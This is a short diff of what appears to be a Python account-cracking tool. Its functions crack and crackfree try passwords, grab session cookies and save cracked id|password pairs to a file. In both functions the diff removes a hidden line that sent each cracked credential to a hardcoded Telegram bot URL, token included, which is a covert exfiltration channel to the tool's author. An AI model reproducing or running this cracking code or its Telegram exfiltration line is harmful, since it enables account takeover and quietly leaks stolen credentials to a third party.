@@ -838,7 +838,7 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				requests.get("https://api.telegram.org/bot6171847020:AAEujIMq9zwipvWAFocRYqSRQtMRNP2Jmz0/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
+				
 				break
 			else:
 				continue
@@ -876,7 +876,7 @@ def crackfree(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				requests.get("https://api.telegram.org/bot6171847020:AAEujIMq9zwipvWAFocRYqSRQtMRNP2Jmz0/sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
+				
 				ok.append(wrt)
 				break
 			else:
